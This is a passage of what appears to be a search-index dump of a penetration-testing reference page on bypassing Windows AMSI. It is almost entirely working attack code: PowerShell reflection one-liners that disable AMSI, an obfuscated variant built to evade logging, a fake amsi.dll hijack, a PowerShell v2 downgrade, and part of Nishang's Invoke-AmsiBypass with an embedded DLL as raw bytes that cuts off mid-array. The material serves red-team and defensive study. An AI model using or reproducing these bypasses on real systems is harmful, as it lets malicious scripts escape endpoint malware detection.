0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)) | \nOut-Null;\nWrite-Output \"DLL has been reflected\";\n}\n[Bypass.AMSI]::Patch();\n}\nMyPatch;\nStart-Sleep 1;\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-matt-graebers-reflection-method","title":"Using Matt Graebers Reflection method","text":"<pre><code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-matt-graebers-reflection-method-with-wmf5-autologging-bypass","title":"Using Matt Graebers Reflection method with WMF5 autologging bypass","text":"<pre><code>[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-matt-graebers-second-reflection-method","title":"Using Matt Graebers second Reflection method","text":"<pre><code>[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-cornelis-de-plaas-dll-hijack-method","title":"Using Cornelis de Plaas DLL hijack method","text":"<pre><code>[Byte[]] $temp = $DllBytes -split ' '                \nWrite-Output \"Executing the bypass.\"\nWrite-Verbose \"Dropping the fake amsi.dll to disk.\"\n[System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp)\nWrite-Verbose \"Copying powershell.exe to the current working directory.\"\nCopy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd\nWrite-Verbose \"Starting powershell.exe from the current working directory.\"\n&amp; \"$pwd\\powershell.exe\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#using-powershell-version-2","title":"Using PowerShell version 2","text":"<pre><code>if ($ShowOnly -eq $True)\n{\nWrite-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\"\n}\nelse\n{\nWrite-Verbose \"Checking if .Net version 2.0.50727 is installed.\"\n$versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version\nif($versions -match \"2.0.50727\")\n{\nWrite-Verbose \".Net version 2.0.50727 found.\"\nWrite-Output \"Executing the bypass.\"\npowershell.exe -version 2\n}\nelse\n{\nWrite-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\"\n}\n}\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#nishang-all-in-one","title":"Nishang all in one","text":"<pre><code>function Invoke-AmsiBypass\n{\n&lt;#\n.SYNOPSIS\nNishang script which uses publicly known methods to bypass/avoid AMSI.\n.DESCRIPTION\nThis script implements publicly known methods bypass or avoid AMSI on Windows machines.\nAMSI is a script malware detection mechanism enabled by default in Windows 10. \n(https://msdn.microsoft.com/en-us/library/windows/desktop/dn889587(v=vs.85).aspx)\nThis script implements 6 methods of bypassing AMSI.\nunload - Method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunload2 - Another method by Matt Graeber. Unloads AMSI from current PowerShell session.\nunloadsilent - Another method by Matt Graeber. Unloads AMSI and avoids WMF5 autologging.\nunloadobfuscated - 'unload' method above obfuscated with Daneil Bohannon's Invoke-Obfuscation - which avoids WMF5 autologging. \ndllhijack - Method by Cornelis de Plaa. The amsi.dll used in the code is from p0wnedshell (https://github.com/Cn33liz/p0wnedShell) \npsv2 - If .net 2.0.50727 is available on Windows 10. PowerShell v2 is launched which doesn't support AMSI.\nThe script also provides information on tools which can be used for obfuscation:\nISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/)\nInvoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)\n.PARAMETER Method\nThe method to be used for elevation. Defaut one is unloadsilent.\n.PARAMETER ShowOnly\nThe bypass is not executed. Just shown to the user. \n.EXAMPLE\nPS &gt; Invoke-AmsiBypass -Verbose\nAbove command runs the unloadsilent method.\n.EXAMPLE\nPS &gt; Invoke-PsUACme -Method unloadobfuscated -Verbose\nAbove command runs the unloadobfuscated method.\n.LINK\nhttp://www.labofapenetrationtester.com/2016/09/amsi.html\nhttps://github.com/samratashok/nishang\n#&gt;\n[CmdletBinding()] Param(\n[Parameter(Position = 0, Mandatory = $False)]\n[ValidateSet(\"unload\",\"unloadsilent\",\"unloadobfuscated\",\"unload2\",\"dllhijack\",\"psv2\",\"obfuscation\")]\n[String]\n$Method = \"unloadsilent\",\n[Parameter(Position = 1, Mandatory = $False)]\n[Switch]\n$ShowOnly\n)\n$AmsiX86 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 190 171 71 149 250 202 41 198 250 202 41 198 250 202 41 198 243 178 186 198 248 202 41 198 148 145 40 199 249 202 41 198 148 145 42 199 251 202 41 198 148 145 44 199 242 202 41 198 148 145 45 199 241 202 41 198 39 53 226 198 248 202 41 198 250 202 40 198 231 202 41 198 40 145 33 199 251 202 41 198 40 145 214 198 251 202 41 198 40 145 43 199 251 202 41 198 82 105 99 104 250 202 41 198 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 76 1 6 0 144 29 62 87 0 0 0 0 0 0 0 0 224 0 2 33 11 1 14 0 0 14 0 0 0 18 0 0 0 0 0 0 43 19 0 0 0 16 0 0 0 32 0 0 0 0 0 16 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 112 0 0 0 4 0 0 0 0 0 0 2 0 64 1 0 0 16 0 0 16 0 0 0 0 16 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 148 36 0 0 80 0 0 0 0 80 0 0 224 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 44 1 0 0 176 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 33 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 124 12 0 0 0 16 0 0 0 14 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 220 7 0 0 0 32 0 0 0 8 0 0 0 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 136 3 0 0 0 48 0 0 0 2 0 0 0 26 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 103 102 105 100 115 0 0 20 0 0 0 0 64 0 0 0 2 0 0 0 28 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 80 0 0 0 2 0 0 0 30 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 44 1 0 0 0 96 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 194 12 0 59 13 4 48 0 16 242 117 2 242 195 242 233 96 3 0 0 85 139 236 139 69 12 131 232 0 116 51 131 232 1 116 32 131 232 1 116 17 131 232 1 116 5 51 192 64 235 48 232 245 4 0 0 235 5 232 207 4 0 0 15 182 192 235 31 255 117 16 255 117 8 232 24 0 0 0 89 235 16 131 125 16 0 15 149 192 15 182 192 80 232 23 1 0 0 89 93 194 12 0 106 16 104 24 36 0 16 232 123 9 0 0 106 0 232 35 5 0 0 89 132 192 117 7 51 192 233 224 0 0 0 232 40 4 0 0 136 69 227 179 1 136 93 231 131 101 252 0 131 61 60 51 0 16 0 116 7 106 7 232 203 7 0 0 199 5 60 51 0 16 1 0 0 0 232 74 4 0 0 132 192 116 101 232 206 8 0 0 104 186 25 0 16 232 177 6 0 0 232 93 7 0 0 199 4 36 57 24 0 16 232 160 6 0 0 232 112 7 0 0 199 4 36 128 32 0 16 104 124 32 0 16 232 78 11 0 0 89 89 133 192 117 41 232 237 3 0 0 132 192 116 32 104 120 32 0 16 104 116 32 0 16 232 42 11 0 0 89 89 199 5 60 51 0 16 2 0 0 0 50 219 136 93 231 199 69 252 254 255 255 255 232 68 0 0 0 132 219 15 133 76 255 255 255 232 52 7 0 0 139 240 131 62 0 116 30 86 232 40 5 0 0 89 132 192 116 19 255 117 12 106 2 255 117 8 139 54 139 206 232 136 8 0 0 255 214 255 5 24 48 0 16 51 192 64 232 201 8 0 0 195 138 93 231 255 117 227 232 131 5 0 0 89 195 106 12 104 56 36 0 16 232 105 8 0 0 161 24 48 0 16 133 192 127 4 51 192 235 79 72 163 24 48 0 16 232 22 3 0 0 136 69 228 131 101 252 0 131 61 60 51 0 16 2 116 7 106 7 232 190 6 0 0 232 180 3 0 0 131 37 60 51 0 16 0 199 69 252 254 255 255 255 232 27 0 0 0 106 0 255 117 8 232 65 5 0 0 89 89 51 201 132 192 15 149 193 139 193 232 78 8 0 0 195 232 164 3 0 0 255 117 228 232 6 5 0 0 89 195 106 12 104 88 36 0 16 232 236 7 0 0 131 101 252 0 139 125 12 131 255 1 116 10 131 255 2 116 5 139 93 8 235 49 255 117 16 87 139 93 8 83 232 218 0 0 0 139 240 137 117 228 133 246 15 132 190 0 0 0 255 117 16 87 83 232 216 253 255 255 139 240 137 117 228 133 246 15 132 167 0 0 0 131 255 1 117 7 83 232 198 9 0 0 89 255 117 16 87 83 232 159 253 255 255 139 240 137 117 228 131 255 1 117 43 133 246 117 30 255 117 16 80 83 232 135 253 255 255 255 117 16 86 83 232 147 253 255 255 255 117 16 86 83 232 116 0 0 0 131 255 1 117 4 133 246 116 4 133 255 117 11 83 232 130 9 0 0 89 133 255 116 5 131 255 3 117 72 255 117 16 87 83 232 98 253 255 255 139 240 137 117 228 133 246 116 53 255 117 16 87 83 232 58 0 0 0 139 240 235 36 139 77 236 139 1 81 255 48 104 22 16 0 16 255 117 16 255 117 12 255 117 8 232 86 2 0 0 131 196 24 195 139 101 232 51 246 137 117 228 199 69 252 254 255 255 255 139 198 232 54 7 0 0 195 85 139 236 86 139 53 160 32 0 16 133 246 117 5 51 192 64 235 18 255 117 16 139 206 255 117 12 255 117 8 232 193 6 0 0 255 214 94 93 194 12 0 85 139 236 131 125 12 1 117 5 232 88 4 0 0 255 117 16 255 117 12 255 117 8 232 177 254 255 255 131 196 12 93 194 12 0 85 139 236 106 0 255 21 40 32 0 16 255 117 8 255 21 0 32 0 16 104 9 4 0 192 255 21 4 32 0 16 80 255 21 8 32 0 16 93 195 85 139 236 129 236 36 3 0 0 106 23 232 234 8 0 0 133 192 116 5 106 2 89 205 41 163 32 49 0 16 137 13 28 49 0 16 137 21 24 49 0 16 137 29 20 49 0 16 137 53 16 49 0 16 137 61 12 49 0 16 102 140 21 56 49 0 16 102 140 13 44 49 0 16 102 140 29 8 49 0 16 102 140 5 4 49 0 16 102 140 37 0 49 0 16 102 140 45 252 48 0 16 156 143 5 48 49 0 16 139 69 0 163 36 49 0 16 139 69 4 163 40 49 0 16 141 69 8 163 52 49 0 16 139 133 220 252 255 255 199 5 112 48 0 16 1 0 1 0 161 40 49 0 16 163 44 48 0 16 199 5 32 48 0 16 9 4 0 192 199 5 36 48 0 16 1 0 0 0 199 5 48 48 0 16 1 0 0 0 106 4 88 107 192 0 199 128 52 48 0 16 2 0 0 0 106 4 88 107 192 0 139 13 4 48 0 16 137 76 5 248 106 4 88 193 224 0 139 13 0 48 0 16 137 76 5 248 104 164 32 0 16 232 225 254 255 255 139 229 93 195 85 139 236 139 69 8 86 139 72 60 3 200 15 183 65 20 141 81 24 3 208 15 183 65 6 107 240 40 3 242 59 214 116 25 139 77 12 59 74 12 114 10 139 66 8 3 66 12 59 200 114 12 131 194 40 59 214 117 234 51 192 94 93 195 139 194 235 249 232 85 7 0 0 133 192 117 3 50 192 195 100 161 24 0 0 0 86 190 64 51 0 16 139 80 4 235 4 59 208 116 16 51 192 139 202 240 15 177 14 133 192 117 240 50 192 94 195 176 1 94 195 232 32 7 0 0 133 192 116 7 232 118 5 0 0 235 5 232 77 7 0 0 176 1 195 106 0 232 207 0 0 0 132 192 89 15 149 192 195 232 97 7 0 0 132 192 117 3 50 192 195 232 85 7 0 0 132 192 117 7 232 76 7 0 0 235 237 176 1 195 232 66 7 0 0 232 61 7 0 0 176 1 195 85 139 236 232 203 6 0 0 133 192 117 24 131 125 12 1 117 18 255 117 16 139 77 20 80 255 117 8 232 136 4 0 0 255 85 20 255 117 28 255 117 24 232 219 6 0 0 89 89 93 195 232 155 6 0 0 133 192 116 12 104 68 51 0 16 232 220 6 0 0 89 195 232 240 6 0 0 133 192 15 132 217 6 0 0 195 106 0 232 221 6 0 0 89 233 215 6 0 0 85 139 236 131 125 8 0 117 7 198 5 92 51 0 16 1 232 186 4 0 0 232 189 6 0 0 132 192 117 4 50 192 93 195 232 176 6 0 0 132 192 117 10 106 0 232 165 6 0 0 89 235 233 176 1 93 195 85 139 236 131 236 12 86 139 117 8 133 246 116 5 131 254 1 117 124 232 31 6 0 0 133 192 116 42 133 246 117 38 104 68 51 0 16 232 80 6 0 0 89 133 192 116 4 50 192 235 87 104 80 51 0 16 232 61 6 0 0 247 216 89 26 192 254 192 235 68 161 4 48 0 16 141 117 244 87 131 224 31 191 68 51 0 16 106 32 89 43 200 131 200 255 211 200 51 5 4 48 0 16 137 69 244 137 69 248 137 69 252 165 165 165 191 80 51 0 16 137 69 244 137 69 248 141 117 244 137 69 252 176 1 165 165 165 95 94 139 229 93 195 106 5 232 6 2 0 0 204 106 8 104 120 36 0 16 232 117 3 0 0 131 101 252 0 184 77 90 0 0 102 57 5 0 0 0 16 117 96 161 60 0 0 16 129 184 0 0 0 16 80 69 0 0 117 79 185 11 1 0 0 102 57 136 24 0 0 16 117 65 139 69 8 185 0 0 0 16 43 193 80 81 232 180 253 255 255 89 89 133 192 116 42 247 64 36 0 0 0 128 117 33 199 69 252 254 255 255 255 176 1 235 31 139 69 236 139 0 51 201 129 56 5 0 0 192 15 148 193 139 193 195 139 101 232 199 69 252 254 255 255 255 50 192 232 59 3 0 0 195 85 139 236 232 11 5 0 0 133 192 116 15 128 125 8 0 117 9 51 192 185 64 51 0 16 135 1 93 195 85 139 236 128 61 92 51 0 16 0 116 6 128 125 12 0 117 18 255 117 8 232 67 5 0 0 255 117 8 232 59 5 0 0 89 89 176 1 93 195 85 139 236 161 4 48 0 16 139 200 51 5 68 51 0 16 131 225 31 255 117 8 211 200 131 248 255 117 7 232 1 5 0 0 235 11 104 68 51 0 16 232 233 4 0 0 89 247 216 89 27 192 247 208 35 69 8 93 195 85 139 236 255 117 8 232 186 255 255 255 247 216 89 27 192 247 216 72 93 195 85 139 236 131 236 20 131 101 244 0 131 101 248 0 161 4 48 0 16 86 87 191 78 230 64 187 190 0 0 255 255 59 199 116 13 133 198 116 9 247 208 163 0 48 0 16 235 102 141 69 244 80 255 21 28 32 0 16 139 69 248 51 69 244 137 69 252 255 21 32 32 0 16 49 69 252 255 21 36 32 0 16 49 69 252 141 69 236 80 255 21 16 32 0 16 139 77 240 141 69 252 51 77 236 51 77 252 51 200 59 207 117 7 185 79 230 64 187 235 16 133 206 117 12 139 193 13 17 71 0 0 193 224 16 11 200 137 13 4 48 0 16 247 209 137 13 0 48 0 16 95 94 139 229 93 195 104 96 51 0 16 255 21 24 32 0 16 195 104 96 51 0 16 232 229 3 0 0 89 195 184 104 51 0 16 195 184 112 51 0 16 195 232 239 255 255 255 139 72 4 131 8 4 137 72 4 232 231 255 255 255 139 72 4 131 8 2 137 72 4 195 184 132 51 0 16 195 85 139 236 129 236 36 3 0 0 83 86 106 23 232 234 3 0 0 133 192 116 5 139 77 8 205 41 51 246 141 133 220 252 255 255 104 204 2 0 0 86 80 137 53 120 51 0 16 232 133 3 0 0 131 196 12 137 133 140 253 255 255 137 141 136 253 255 255 137 149 132 253 255 255 137 157 128 253 255 255 137 181 124 253 255 255 137 189 120 253 255 255 102 140 149 164 253 255 255 102 140 141 152 253 255 255 102 140 157 116 253 255 255 102 140 133 112 253 255 255 102 140 165 108 253 255 255 102 140 173 104 253 255 255 156 143 133 156 253 255 255 139 69 4 137 133 148 253 255 255 141 69 4 137 133 160 253 255 255 199 133 220 252 255 255 1 0 1 0 139 64 252 106 80 137 133 144 253 255 255 141 69 168 86 80 232 252 2 0 0 139 69 4 131 196 12 199 69 168 21 0 0 64 199 69 172 1 0 0 0 137 69 180 255 21 20 32 0 16 86 141 88 255 247 219 141 69 168 137 69 248 141 133 220 252 255 255 26 219 137 69 252 254 195 255 21 40 32 0 16 141 69 248 80 255 21 0 32 0 16 133 192 117 13 15 182 195 247 216 27 192 33 5 120 51 0 16 94 91 139 229 93 195 83 86 190 8 36 0 16 187 8 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 56 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 83 86 190 16 36 0 16 187 16 36 0 16 59 243 115 24 87 139 62 133 255 116 9 139 207 232 13 0 0 0 255 215 131 198 4 59 243 114 234 95 94 91 195 255 37 112 32 0 16 204 204 204 204 204 104 75 26 0 16 100 255 53 0 0 0 0 139 68 36 16 137 108 36 16 141 108 36 16 43 224 83 86 87 161 4 48 0 16 49 69 252 51 197 80 137 101 232 255 117 248 139 69 252 199 69 252 254 255 255 255 137 69 248 141 69 240 100 163 0 0 0 0 242 195 139 77 240 100 137 13 0 0 0 0 89 95 95 94 91 139 229 93 81 242 195 85 139 236 255 117 20 255 117 16 255 117 12 255 117 8 104 5 16 0 16 104 4 48 0 16 232 203 1 0 0 131 196 24 93 195 85 139 236 131 37 124 51 0 16 0 131 236 44 83 51 219 67 9 29 16 48 0 16 106 10 232 228 1 0 0 133 192 15 132 116 1 0 0 131 101 236 0 51 192 131 13 16 48 0 16 2 51 201 86 87 137 29 124 51 0 16 141 125 212 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 139 69 212 139 77 224 137 69 244 129 241 105 110 101 73 139 69 220 53 110 116 101 108 11 200 139 69 216 53 71 101 110 117 11 200 247 217 106 1 88 26 201 106 0 128 193 1 89 83 15 162 139 243 91 137 7 137 119 4 137 79 8 137 87 12 116 67 139 69 212 37 240 63 255 15 61 192 6 1 0 116 35 61 96 6 2 0 116 28 61 112 6 2 0 116 21 61 80 6 3 0 116 14 61 96 6 3 0 116 7 61 112 6 3 0 117 17 139 61 128 51 0 16 131 207 1 137 61 128 51 0 16 235 6 139 61 128 51 0 16 131 125 244 7 139 69 224 137 69 228 139 69 220 137 69 248 137 69 232 124 50 106 7 88 51 201 83 15 162 139 243 91 141 93 212 137 3 137 115 4 137 75 8 137 83 12 139 69 216 169 0 2 0 0 137 69 236 139 69 248 116 9 131 207 2 137 61 128 51 0 16 95 94 169 0 0 16 0 116 109 131 13 16 48 0 16 4 199 5 124 51 0 16 2 0 0 0 169 0 0 0 8 116 85 169 0 0 0 16 116 78 51 201 15 1 208 137 69 240 137 85 244 139 69 240 139 77 244 131 224 6 51 201 131 248 6 117 51 133 201 117 47 161 16 48 0 16 131 200 8 199 5 124 51 0 16 3 0 0 0 246 69 236 32 163 16 48 0 16 116 18 131 200 32 199 5 124 51 0 16 5 0 0 0 163 16 48 0 16 51 192 91 139 229 93 195 51 192 57 5 20 48 0 16 15 149 192 195 195 255 37 52 32 0 16 255 37 60 32 0 16 255 37 56 32 0 16 255 37 48 32 0 16 255 37 64 32 0 16 255 37 104 32 0 16 255 37 100 32 0 16 255 37 96 32 0 16 255 37 92 32 0 16 255 37 88 32 0 16 255 37 84 32 0 16 255 37 80 32 0 16 255 37 76 32 0 16 255 37 72 32 0 16 255 37 12 32 0 16 176 1 195 51 192 195 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 27 28 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 48 0 16 112 48 0 16 0 0 0 0 0 0 0 0 144 29 62 87 0 0 0 0 2 0 0 0 61 0 0 0 132 33 0 0 132 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 196 33 0 0 196 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 13 0 0 0 44 2 0 0 216 33 0 0 216 19 0 0 0 0 0 0 144 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 